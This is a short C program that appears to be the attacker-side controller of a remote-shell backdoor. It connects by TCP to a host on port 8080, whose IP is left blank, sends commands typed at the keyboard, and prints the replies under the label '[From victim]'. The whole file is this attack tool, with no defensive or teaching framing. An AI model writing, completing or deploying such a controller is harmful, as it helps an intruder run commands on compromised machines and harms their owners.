#include <stdio.h> 
#include <sys/socket.h> 
#include <arpa/inet.h> 
#include <unistd.h> 
#include <string.h> 
#define PORT 8080 
   
int main(int argc, char const *argv[]) 
{ 
    int sock = 0, valread; 
    struct sockaddr_in serv_addr; 

    char buffer[1024] = {0}; 
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) 
    { 
        printf("\n Socket creation error \n"); 
        return -1; 
    } 
   
    serv_addr.sin_family = AF_INET; 
    serv_addr.sin_port = htons(PORT); 
       
    // Convert IPv4 and IPv6 addresses from text to binary form      
    const char *IP = "";
   	if(inet_pton(AF_INET, IP, &serv_addr.sin_addr)<=0)  
    { 
        printf("\nInvalid address/ Address not supported \n"); 
        return -1; 
    } 
   
    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) 
    { 
        printf("\nConnection Failed \n"); 
        return -1; 
    } 
  
    printf("\033[0;32mCONNECTED SUCCESSFULLY!!!!!!!!!!!!\033[0m\n");
    while(1==1) {
    	printf("\033[0;33m[Your command]:\033[0m ");
    	char hello[1024] = "";
    	fgets(hello, sizeof(hello), stdin);

    	send(sock, hello , strlen(hello) , 0 );

      	char buffer[1024]={0};
    	valread = read( sock , buffer, 1024);
    	printf("\033[0;31m[From victim]:\033[0m %s",buffer);
    }
    return 0; 
} 
